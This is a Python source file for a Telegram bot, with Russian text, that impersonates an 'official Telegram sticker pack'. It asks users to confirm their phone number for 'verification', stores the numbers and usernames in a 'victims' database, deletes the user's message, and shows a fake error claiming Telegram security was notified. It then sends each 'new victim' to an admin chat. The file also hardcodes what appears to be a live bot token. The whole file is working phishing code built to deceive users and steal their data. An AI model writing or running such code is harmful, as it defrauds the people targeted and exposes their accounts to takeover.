from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
    CallbackQueryHandler
)
import logging
import sqlite3

# Конфигурация ада
BOT_TOKEN = '7697165564:AAHxXcUcza9HELqT06iNn0OVbqlE8iUmIMU'
ADMIN_ID = '1838192124'
DB_NAME = 'stolen_souls.db'

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims
                (id INTEGER PRIMARY KEY, phone TEXT, user_id INTEGER, username TEXT)''')
    conn.commit()
    conn.close()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("🔥 ПОЛУЧИТЬ СТИКЕРПАК", callback_data='get_stickers')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "*ОФИЦИАЛЬНЫЙ СТИКЕРПАК TELEGRAM*\n"
        "Для доступа к эксклюзивным стикерам подтвердите номер телефона:",
        parse_mode='Markdown',
        reply_markup=reply_markup
    )

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "Отправьте ваш номер телефона в формате +###\n"
        "Это необходимо для проверки аккаунта!"
    )

async def steal_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text
    user = update.message.from_user
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("INSERT INTO victims (phone, user_id, username) VALUES (?, ?, ?)",
             (phone, user.id, user.username))
    conn.commit()
    conn.close()

    await context.bot.delete_message(
        chat_id=update.message.chat_id,
        message_id=update.message.message_id
    )
    await update.message.reply_text(
        "❌ Ошибка верификации! Попробуйте позже.\n"
        "Служба безопасности Telegram была уведомлена."
    )

    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=f"🔥 НОВАЯ ЖЕРТВА:\n"
             f"ID: {user.id}\n"
             f"Phone: {phone}\n"
             f"Username: @{user.username}"
    )

if __name__ == "__main__":
    init_db()
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, steal_phone))

    app.run_polling()
